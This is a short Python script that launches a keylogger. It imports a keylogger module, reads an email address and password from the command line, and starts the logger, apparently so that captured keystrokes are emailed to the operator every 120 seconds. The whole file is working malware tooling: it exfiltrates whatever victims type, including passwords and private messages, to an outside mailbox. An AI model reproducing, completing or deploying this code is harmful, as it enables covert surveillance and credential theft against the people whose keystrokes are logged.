#!/usr/bin/env python

import keylogger
import optparse

def get_arguments():
    parser = optparse.OptionParser()

    parser.add_option("-e", "--email", dest="email", help="Email address")
    parser.add_option("-p", "--password", dest="pwd", help="Email's password")

    options,arguments = parser.parse_args()

    if not options.email:
        parser.error("[-] Please specify an email address to send the report to.")
    if not options.pwd:
        parser.error("[-] Please specify the email's password.")

    return options


try:
    args = get_arguments()
    logger = keylogger.Keylogger(120,args.email, args.pwd)
    logger.start()
except KeyboardInterrupt:
    print()
